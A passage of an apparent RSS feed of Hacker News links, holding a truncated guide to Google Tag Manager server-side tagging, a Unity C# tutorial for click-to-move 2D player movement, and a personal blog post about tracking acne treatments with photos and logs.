<p>This article <strong>will not be</strong> an exhaustive guide. I will walk you through the main concepts of Server-side tagging and there should be little you’ll be left wanting, but to complement this article, I do recommend you consult Google’s <a href="https://developers.google.com/tag-manager/serverside">own, official documentation</a>.</p>

<h2 id="how-to-follow-this-guide">How to follow this guide</h2>
<p>While I hope everyone would devour every last word of this article, I’m aware that not all sections are relevant to all readers.</p>
<p>If you’re looking for an overview of Server-side tagging, perhaps for getting buy-in within your organization, I recommend reading these chapters:</p>
<ul>
<li><a href="#what-is-server-side-tagging">What is Server-side tagging</a></li>
<li><a href="#reduced-client-load">Key benefits - Reduced client load</a></li>
<li><a href="#content-security-policy">Key benefits - Content Security Policy</a></li>
<li><a href="#full-control-and-ownership-of-the-data-collected-by-the-container">Key benefits - Full control and ownership of the data collected by the container</a></li>
<li><a href="#key-concerns">Key concerns - All chapters</a></li>
<li><a href="#cost-1">Technical outline - Cost</a></li>
<li><a href="#custom-domain">Technical outline - Custom domain</a></li>
<li><a href="#summary">Summary</a></li>
</ul>
<p>If you’re a developer or working in IT, I’d recommend focusing on these chapters:</p>
<ul>
<li><a href="#what-is-server-side-tagging">What is Server-side tagging</a></li>
<li><a href="#reduced-client-load">Key benefits - Reduced client load</a></li>
<li><a href="#keep-keys-and-secrets-safe">Key benefits - Keep keys and secrets safe</a></li>
<li><a href="#more-control-over-what-endpoints-collect">Key benefits - More control over what endpoints collect</a></li>
<li><a href="#content-security-policy">Key benefits - Content Security Policy</a></li>
<li><a href="#key-concerns">Key concerns - All chapters</a></li>
<li><a href="#server-container">Technical outline - Server container</a></li>
<li><a href="#custom-domain">Technical outline - Custom domain</a></li>
<li><a href="#clients-and-tags">Technical outline - Clients and tags</a></li>
<li><a href="#custom-templates">Technical outline - Custom templates</a></li>
<li><a href="#resources">Technical outline - Resources</a></li>
<li><a href="#summary">Summary</a></li>
</ul>
<p>Everything else is still important, but I’ll forgive you if you gloss over them initially, only to return to them hungrily once you’re hooked into all the awesomeness that Server-side tagging brings in its wake.</p>
<p>I recommend you watch the following two videos regardless.</p>
<p>The first one is a general introduction to <strong>Server-side tagging</strong>, focusing on deployment and getting started with your first Client and tag.</p>
<p>The second is a deep-dive into building your own Client template. It’s a bit more specialized and can thus be skipped if you’re not interested in customizing the container.</p>
<h3 id="video-introduction-to-server-side-tagging">Video: Introduction to Server-side tagging</h3>
<p>
<iframe src="https://www.youtube.com/embed/6OGbOh216mU?enablejsapi=1" allowfullscreen="" title="YouTube Video"></iframe>
</p>
<p>If the video doesn’t work, you can watch it <a href="https://youtu.be/6OGbOh216mU">here</a>.</p>
<h3 id="video-create-a-client-template-in-a-server-container">Video: Create a Client template in a Server container</h3>
<blockquote>
<p><strong>NOTE!</strong> The video below has one important omission. When creating the <strong>Client</strong> template, make sure to update the “Sends HTTP Requests” permission to include “Allow Google Domains”. Otherwise the proxying of analytics.js doesn’t work.</p>
</blockquote>
<p>
<iframe src="https://www.youtube.com/embed/_c4JEfSkP6U?enablejsapi=1" allowfullscreen="" title="YouTube Video"></iframe>
</p>
<p>If the video doesn’t work, you can watch it <a href="https://youtu.be/_c4JEfSkP6U">here</a>.</p>
<h2 id="what-is-server-side-tagging">What is Server-side tagging?</h2>
<p><a href="https://www.simoahava.com/images/2020/07/server-side-tagging-outline.jpg" title="Server-side tagging outline">
<img data-src="https://www.simoahava.com/images/2020/07/server-side-tagging-outline.jpg#ZgotmplZ" alt="Server-side tagging outline" src="https://www.simoahava.com/images/2020/07/server-side-tagging-outline.jpg#ZgotmplZ">
</a>
</p>
<p>With Server-side tagging, Google Tag Manager has introduced a new <strong>Server</strong> container type, which resides in a <a href="https://cloud.google.com/">Google Cloud</a> environment.</p>
<p>In a nutshell, the purpose of this setup is to create an endpoint in a server environment that <strong>you own</strong>. It will act as a sort of a <strong>proxy</strong> between the hits sent from browsers and devices and the actual endpoints to which the hits are collected. See the <a href="#key-benefits">next chapter</a> for more details on what this type of proxy can do.</p>
<p>The container itself operates as an HTTP API endpoint, to which any browser, device, or other sources that support the HTTP protocol can send requests.</p>
<p>Ideally, this endpoint would be mapped with a <strong>custom subdomain</strong> in the same domain hierarchy as the website sending the requests. That way the requests are considered to happen in <a href="https://www.cookiestatus.com/introduction/tracking-protection/#first-party-and-third-party-context">first-party context</a>, which has a significant impact on how cookies can be read and written, for example.</p>
<p>Within the Server container, workers known as <strong>Clients</strong> are configured to listen for these incoming HTTP requests, which they then parse into a <strong>unified event format</strong>. The Clients then run a <em>virtual container</em> with the <a href="#event-model">event data object</a>, where tags, triggers, and variables react to the event push similar to how they would with “regular” Google Tag Manager.</p>
<p>Tags take the information in these event data objects and compile them into HTTP requests to their respective endpoints. Finally, the Client sends an HTTP response back to the source of the initial request.</p>
<p><a href="https://www.simoahava.com/images/2020/07/ua-response.jpg" title="Example of a Universal Analytics client responding with a success status and setting the _ga cookie in the response.">
<img data-src="https://www.simoahava.com/images/2020/07/ua-response.jpg#ZgotmplZ" alt="Example of a Universal Analytics client responding with a success status and setting the _ga cookie in the response." src="https://www.simoahava.com/images/2020/07/ua-response.jpg#ZgotmplZ">
</a>
<span>Example of a Universal Analytics client responding with a success status and setting the _ga cookie in the response.</span>
</p>
<p>All of the above happens within the confines of the Server-side tagging environment. The only way the browser or app sending the data can be made aware of what’s going on is if the <strong>Client</strong> adds information into the HTTP response, which is fully configurable.</p>
<h2 id="key-benefits">Key benefits</h2>
<p>Here are some of the key benefits of using Server-side tagging.</p>
<h3 id="reduced-client-load">Reduced client load</h3>
<p>By running the logic of building and dispatching hits to the vendor endpoint in your server-side environment, you have a golden opportunity to reduce the amount of (especially third-party) JavaScript run in the user’s browser.</p>
<p>Because you can configure the Server container to map <em>any</em> incoming HTTP request into the format required by the vendor, you can theoretically reduce your entire third-party pixel and JavaScript load to a single event stream directed into your Server container.</p>
<p><a href="https://www.simoahava.com/images/2020/07/all-javascript.jpg" title="Imagine if you could reduce the amount of JavaScript loaded and executed in the browser...">
<img data-src="https://www.simoahava.com/images/2020/07/all-javascript.jpg#ZgotmplZ" alt="Imagine if you could reduce the amount of JavaScript loaded and executed in the browser..." src="https://www.simoahava.com/images/2020/07/all-javascript.jpg#ZgotmplZ">
</a>
<span>Imagine if you could reduce the amount of JavaScript loaded and executed in the browser...</span>
</p>
<p>This stream can then be intercepted by a Client which proceeds to map the stream into the <a href="#event-model">event model</a> expected by the vendor tags, also running in the Server container.</p>
<p>This is the <strong>ultimate benefit</strong> of a Server-side tagging setup. Even if you don’t want to reduce everything to a single stream, you can build your own <a href="https://www.simoahava.com/analytics/custom-templates-guide-for-google-tag-manager/">custom template</a> in the web container, which builds the HTTP request to the Server container without having to load any third-party JavaScript at all (apart from the GTM library itself).</p>

<h3 id="keep-keys-and-secrets-safe">Keep keys and secrets safe</h3>
<p>By transporting data processing logic away from the device, where it would be visible for anyone with debugging skills, you will also be able to run secured and credential-based transactions without having to worry about exposing sensitive information to the device.</p>
<p>For example, a plague on Google Analytics has been <a href="https://help.analyticsedge.com/article/definitive-guide-to-removing-google-analytics-spam/">Measurement Protocol spam</a>, where malicious parties crawl potential tracking IDs and then proceed to spam them with automated HTTP requests that masquerade as “regular” hits from the site. Alternatively, these hackers send spam hits to <strong>random tracking IDs</strong>, knowing that if they send enough hits, some of them will end up in real Universal Analytics accounts.</p>
<p>This type of spam is notoriously difficult to identify and prevent because it’s built to resemble actual hits that are sent from the website itself.</p>
<p>Now that you have the server endpoint handy, you can add a new <strong>Custom Dimension</strong> within the Server container, which is then sent to Google Analytics. In Google Analytics, you can then create a filter for this Custom Dimension, allowing only traffic that matches it.</p>
<div><pre><code data-lang="javascript">event[<span>'x-ga-mp1-cd11'</span>] = <span>'my_secret_key'</span>;
</code></pre></div>
<p><a href="https://www.simoahava.com/images/2020/07/custom-dimension-set.jpg" title="Secret key custom dimension">
<img data-src="https://www.simoahava.com/images/2020/07/custom-dimension-set.jpg#ZgotmplZ" alt="Secret key custom dimension" src="https://www.simoahava.com/images/2020/07/custom-dimension-set.jpg#ZgotmplZ">
</a>
</p>
<p>By adding this “secret key” in the Server container, there’s no way that a random Measurement Protocol spammer can know it’s there. Similarly, it won’t help if the spammer crawls your site, looking at the requests sent to Google Analytics, because there are no such requests! There are only requests to your own server-side endpoint, and it would be odd if Measurement Protocol spammers would utilize those to fuel their spam algorithms.</p>
<p>Naturally, this isn’t limited to just what you can do with Universal Analytics. Any third-party servers that identify your access with an <strong>API key</strong> or <strong>credential token</strong> can now be proxied through your Server container so that these keys are not exposed in the device!</p>
<h3 id="more-control-over-what-endpoints-collect">More control over what endpoints collect</h3>
<p>Because your proxy now resides between the user’s device and the endpoint, you are in full control over what is shipped to the vendor.</p>
<p>Unless the Client <a href="https://developers.google.com/tag-manager/serverside/api#getremoteaddress">specifically overrides</a> things like the IP address and User-Agent in the outgoing HTTP request from the Server container (this is what the built-in Universal …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="Https://www.simoahava.com/analytics/server-side-tagging-google-tag-manager">Https://www.simoahava.com/analytics/server-side-tagging-google-tag-manager</a></em></p>]]>
            </description>
            <link>Https://www.simoahava.com/analytics/server-side-tagging-google-tag-manager</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275661</guid>
            <pubDate>Tue, 25 Aug 2020 20:21:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unity top down movement: 2d player script]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275642">thread link</a>) | @generalistp
<br/>
August 25, 2020 | https://generalistprogrammer.com/game-design-development/unity-2d-movement-top-down-tutorial/ | <a href="https://web.archive.org/web/*/https://generalistprogrammer.com/game-design-development/unity-2d-movement-top-down-tutorial/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
	
<p>Doing 2D top down movement in Unity for your player can easily be achieved with some basic Unity functions and a small script. </p>



<p>First we just going to setup our project. If you don’t want to follow along on this page you can watch the video version below:</p>



<iframe loading="lazy" width="560" height="315" src="about:blank" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" data-rocket-lazyload="fitvidscompatible" data-lazy-src="https://www.youtube.com/embed/IP30ys3CN2g"></iframe>



<h3>Setting up our top down game scene</h3>



<p>On the left hand side in the Unity hierarchy right click and create a empty game object. In the inspector add a sprite renderer component.</p>



<p>Copy the following inspector settings, the most import settings is the position and the order in layer must be -100 so the background renders at the back of all your assets in your game scene.</p>



<figure><img loading="lazy" width="388" height="429" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image.png" alt="unity 2d move up and down" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image.png 388w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-271x300.png 271w" sizes="(max-width: 388px) 100vw, 388px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20388%20429'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image.png 388w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-271x300.png 271w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image.png"></figure>



<p>Add in your background image into the sprite slot and you are ready to go. You now have a nice background in my case I have something that looks like this.</p>



<figure><img loading="lazy" width="733" height="725" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1.jpg" alt="Background image in our scene in the top down" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1.jpg 733w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1-300x297.jpg 300w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1-640x633.jpg 640w" sizes="(max-width: 733px) 100vw, 733px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20733%20725'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1.jpg 733w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1-300x297.jpg 300w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1-640x633.jpg 640w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-1.jpg"></figure>



<h3>Adding our player to our scene: unity top down movement</h3>



<p>Right click in the hierarchy again and create a new game object, rename it and call it Player. </p>



<p>In the inspector add a Rigidbody 2D.  Copy the details below:</p>



<figure><img loading="lazy" width="390" height="454" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2.png" alt="Player movement settings inspector" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2.png 390w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2-258x300.png 258w" sizes="(max-width: 390px) 100vw, 390px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20390%20454'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2.png 390w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2-258x300.png 258w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-2.png"></figure>



<p>You should now have your player in the scene and should look something like this now.</p>



<figure><img loading="lazy" width="608" height="648" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3.jpg" alt="Unity 2D movement top down without our player added" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3.jpg 608w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3-281x300.jpg 281w" sizes="(max-width: 608px) 100vw, 608px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20608%20648'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3.jpg 608w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3-281x300.jpg 281w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-3.jpg"><figcaption>Unity 2D movement top down</figcaption></figure>



<h3>Write our code for our Unity 2D top down player movement controller</h3>



<p>First off click on your player game object. Add a new component in the inspector called Player Movement. </p>



<p>Like below this is going to be our 2d character controller :</p>



<figure><img loading="lazy" width="275" height="257" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-4.png" alt="movement code 2d unity" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20275%20257'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-4.png"></figure>



<p>Now open up your new c# script in visual studio. </p>



<p>We need to now define a few things, we first of all want to control our player movement speed so we will need a player movement variable. </p>



<p>Next we need a target position variable which will be the position we want our player to move towards. </p>



<p>We now need to use some of the built in Unity functions like the Vector2.MoveTowards method. Also we will use time.deltaTime to make sure our movement is frame rate independent. </p>



<p>We will also use ScreenToWorldPoint to convert our mouse position on screen to a point in our world. </p>



<p>We will use the Input class to get the position of our mouse clicks.</p>



<p>Lets get into the code.</p>



<pre><code lang="csharp">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class PlayerMovement : MonoBehaviour
{
    // Start is called before the first frame update
   
    public float speed;
    private Vector2 targetPosition;
    void Start()
    {
        
        targetPosition = new Vector2(0.0f, 0.0f);
    }

    // Update is called once per frame
    void Update()
    {
        if (Input.GetMouseButtonDown(0))
        {
            targetPosition = Input.mousePosition;
            targetPosition = Camera.main.ScreenToWorldPoint(new Vector3(targetPosition.x, targetPosition.y, 0.0f));
        }
        this.transform.position = Vector2.MoveTowards(this.transform.position, targetPosition, speed * Time.deltaTime);
           
       
    }
}
</code></pre>



<p>Just a quick explanation on how this code works. In the start method we just set a start position to 0.0f and 0.0f just to start with a default position. </p>



<p>Our player initially will also be at 0,0 in our scene so when our game starts our player won’t jump or move. </p>



<p>Next in the update method we need to get our mouse input. So we call Input.GetMouseButtonDown(0) the zero is for the left click on our mouse.  We then set our targetPosition to our mousePosition. </p>



<p>We then take those co ordinates to worldPoints the ScreenToWolrdPoint method needs a Vector3 in our case we just pass the x and y position because we are only moving in 2D space. </p>



<p>Then finally we set the transform position of our player by calling Vector2.MoveTowards with the player current position and target position. </p>



<p>We plugin our speed and multiply it by Time.deltaTime to make our movement frame rate independent.</p>



<h3>Setting our player movement speed</h3>



<p>Once you have saved the script. Close visual studio and now we just need to give our player a movement speed.</p>



<figure><img loading="lazy" width="397" height="158" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5.png" alt="unity top down movement rotation" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5.png 397w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5-300x119.png 300w" sizes="(max-width: 397px) 100vw, 397px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20397%20158'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5.png 397w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5-300x119.png 300w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-5.png"></figure>



<p>I just chose a speed of 10 which is a decent smooth speed for our player to move. </p>



<p>Well done if you have done everything correctly you should now have your first Unity 2D top down player movement working. </p>



<p>What’s great about this very basic movement script is that it can be used for so many types of games. </p>



<p>Adventure games, rpg style games, if you wanted to stick to complete rpg style you would just have to make sure your Vector in your MoveTowards is locked to one axis at a time because your player can only move up or down and left or right not diagonally.</p>



<h3>Weird issues you might have</h3>



<p>You might have run into some issues. Where your player might be falling off the screen when you hit play. </p>



<p>In order to make your unity 2d top down&nbsp;gravity work properly you need to set your gravity scale to 0 in your Rigidbody 2D component. Like so:</p>



<figure><img loading="lazy" width="376" height="141" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6.png" alt="unity 2d top down gravity" srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6.png 376w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6-300x113.png 300w" sizes="(max-width: 376px) 100vw, 376px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20376%20141'%3E%3C/svg%3E" data-lazy-srcset="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6.png 376w, https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6-300x113.png 300w" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2019/07/image-6.png"><figcaption> unity 2d top down&nbsp;gravity </figcaption></figure>



<p>If this tutorial and want to learn more about making 2d games with unity check out our <a href="http://generalistprogrammer.com/category/game-design-development/">game development</a> section.</p>



<p>So I hope you liked this short tutorial on unity movement and how you can move a player easily in unity using a c# script. There are a lot of ways in which you can create player movement and more.</p>



<p>Some of which is using animation transitions. You could also use a physics based approach propelling your player on screen as well. It’s really up to your creativity. However hopefully this will get you off to a good start.</p>





</div></div>]]>
            </description>
            <link>https://generalistprogrammer.com/game-design-development/unity-2d-movement-top-down-tutorial/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275642</guid>
            <pubDate>Tue, 25 Aug 2020 20:19:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thinking Scientifically to Get Rid of Acne: The SkinTheory Method]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275521">thread link</a>) | @jealousgelatin
<br/>
August 25, 2020 | https://blog.skintheory.app/skintheorys-birth/ | <a href="https://web.archive.org/web/*/https://blog.skintheory.app/skintheorys-birth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Click <a href="#acne-method">here</a> to skip to my acne solution section if you’d like. Read on if you’d like the whole story!</p>



<p>Hey there, I’m Conor. I’m a software engineer, I like to make indie music, and I’m an alumnus of suffering from some pretty bad acne.</p>



<p>Living with acne has been a humbling test of confidence. Talking about it this openly on the internet is something I don’t find easy, even though I no longer really have any acne. I’d like to share my success story in hopes of inspiring you guys to solve your acne with a new mindset.</p>



<h2>Here’s what I used to look like</h2>







<p>So, here I am on April 25, 2017. I’m 21 years old and a junior in University of Pittsburgh. My face hurts me, both mentally and physically. I had intense cystic acne that was deep enough to continue causing new pimples. Some days, I would leave class early because I felt gross and my face hurt.</p>



<h2>Bad Acne Can Be Hard To Get Rid Of</h2>



<div><figure><img loading="lazy" width="580" height="447" src="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=580%2C447&amp;ssl=1" alt="" srcset="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1024%2C789&amp;ssl=1 1024w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=300%2C231&amp;ssl=1 300w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=768%2C592&amp;ssl=1 768w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1536%2C1184&amp;ssl=1 1536w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1200%2C925&amp;ssl=1 1200w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?w=1650&amp;ssl=1 1650w" sizes="(max-width: 580px) 100vw, 580px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1024%2C789&amp;ssl=1 1024w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=300%2C231&amp;ssl=1 300w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=768%2C592&amp;ssl=1 768w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1536%2C1184&amp;ssl=1 1536w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=1200%2C925&amp;ssl=1 1200w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?w=1650&amp;ssl=1 1650w" data-lazy-src="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/Screen-Shot-2020-05-04-at-10.17.27-1.png?resize=580%2C447&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Tons and Tons of different acne medications</figcaption></figure></div>



<p>I was looking for anything that would solve my acne. I was constantly trying new regimens and routines: regimens I’d found online, advice from my dermatologist, regimens that I’d concocted out of thin air, etc. There are an enormous amount of resources/communities online where I ‘d sourced these ideas from acne.org, <a href="https://www.reddit.com/r/skincareaddiction">reddit.com/r/skincareaddiction</a>, bloggers/youtube. While these communities were great for inspiration, they also created an information overload.</p>



<p>Each community would have their own regimens to try, some of which would contradict one another, some regimens were straight up paid celebrity/blogger propaganda, some regimens were just placebos. Forums could be filled with people saying, “This product is a miracle cure!”, while others said the product had flared up their acne. It was tough to find scientific, unbiased reviews of regimens to try on my own skin.</p>



<p>To compound this, trying a new routine on skin is a frustratingly slow process. Unfortunately, overnight cures don’t yet exist for acne. Changes in skin from a new regimen can take days or weeks to be seen and sometimes the skin will get worse before it gets better. There are also external forces working on your skin, like stress in school or work, sweating from working out, and climate (like warmer weather). <strong>I needed to experiment with my own skin and environment to accurately understand what was causing my acne.</strong></p>



<h2>Solving My Acne Scientifically</h2>



<div><figure><img loading="lazy" src="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/540px-CNX_Psych_02_01_Method.jpg?resize=405%2C348&amp;ssl=1" alt="" width="405" height="348" srcset="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/540px-CNX_Psych_02_01_Method.jpg?w=540&amp;ssl=1 540w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/540px-CNX_Psych_02_01_Method.jpg?resize=300%2C258&amp;ssl=1 300w" sizes="(max-width: 405px) 100vw, 405px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/540px-CNX_Psych_02_01_Method.jpg?w=540&amp;ssl=1 540w, https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/540px-CNX_Psych_02_01_Method.jpg?resize=300%2C258&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/540px-CNX_Psych_02_01_Method.jpg?resize=405%2C348&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The handy dandy scientific method</figcaption></figure></div>



<p>It’s an understatement to say that tackling my acne seemed like a daunting challenge. It felt hopeless some days. I would try different regimens, my acne would flare, and I’d have no clue as to why. So I’d switch to a different regimen after a few days and still have no luck. Eventually I would return, cyclically to the same non-working regimens and never get anywhere.</p>



<p>I was still in college at this time, studying mainly Computer Science. I really dug my CS degree. Everyone has seen all the wild stuff that comes out of CS like machine learning and what not, but I think CS gave me something something else: a process for solving complex problems.</p>



<p>In the abstract, students of Computer Science are taught logical ways of problem solving. We are taught multiple sets of <a href="https://medium.com/@codingfreak/top-algorithms-data-structures-concepts-every-computer-science-student-should-know-e0549c67b4ac">rules</a> which we will use for transforming raw data inputs into our ideal and repeatable data outputs. What started as completely impossible problems (i.e <a href="https://www.geeksforgeeks.org/reverse-a-linked-list/">reversed linked list problems</a>) became trivial with these processes of algorithmic thinking. <a href="#note-1">[1]</a></p>



<h3 id="acne-method">My Acne Management Method</h3>



<p><em>Side Note: See the below section: <a href="#making-method-easier">Making The Method Easier</a> for a better experience.</em></p>



<p>With these newfound algorithmic ways of thinking, it was time logically get rid of my acne. Using the scientific method as a guideline, I decided to narrow down what factors affected my skin and try different product regimens to find my cure. The process looked like so:</p>



<ol><li><strong>Create a Hypothesis</strong>: I would choose a regimen to follow for some amount of time. Maybe I’d try a regimen I’d found on acne.org.<ul><li>e.g “Benzoyl Peroxide on left side of face, 1x a day; Moisturize 1x a day for 2 weeks.”</li></ul></li><li><strong>Run the Experiment</strong>: Every day or two I would:<ol><li>Take pictures of the affected areas with my new regimen.</li><li>Write a log in a private Google Doc the status of my skin and how the experiment was going. This log includes how my skin looks and feels, and any externalities that could affect the experiment. These logs would allow me to pinpoint how I felt about my skin over time.<ul><li>e.g “I have 10 pimples today and a good bit of redness. Mostly on the right side of my face. They do feel a bit less inflamed today. I also forgot to shower after working out yesterday, and woke up feeling sweaty. OOF 😕”</li></ul></li></ol></li><li><strong>Analyze the Results</strong>: After a solid time period (and 2 weeks may not always be enough!), I would compare my photos and logs from today to before I began this regimen’s experiment. If I showed some improvement, I would keep up the regimen. If I was getting worse, I would tweak the regimen or completely change to a new one with a day or 2 of buffer in between.</li></ol>



<p>I began to take a secret joy in doing this method. Firstly, I felt like I was actively working towards clearing my acne every night. I would come up with new ideas through the week and save them for later to try. Secondly, I felt like I wasn’t completely lost with my acne anymore. I used to get overwhelmed trying to keep all of my past treatments and externalities (food, sleep schedules, stress, etc.) together in my head. I would recurrently try regimens that I’d already attempted and forgot about to see if they’d work this time. Now, I had a mental map, process, and actual log of what worked and what didn’t.</p>



<h4>Issues</h4>



<p>The above method worked, but it is definitely rudimentary and so I’d found a few annoyances.</p>



<ul><li><a href="https://docs.google.com/">Google Docs</a> and <a href="https://blog.skintheory.app/skintheorys-birth/Flickr.com">Flickr</a> (where I stored my photos) were completely unlinked. They are 2 different apps. I would have to date entries in the Google Doc and find them in another tab on Flickr to find the photos.</li><li>I had to use Flickr to store my photos because I now had nightly acne selfies showing up in my phone’s gallery. If I were then trying to show a friend another picture, all these acne photos would pop up. 😐 Also, Flickr, now has a 1k picture upload limit. 😐</li></ul>



<h2 id="making-method-easier">Making The Method Easier: The SkinTheory App</h2>







<p>As someone who was able to beat their acne by thinking this way, I wanted to share this scientific process with kindred spirits who I knew were suffering as well. Unfortunately, my home-brewed process felt kinda janky.</p>



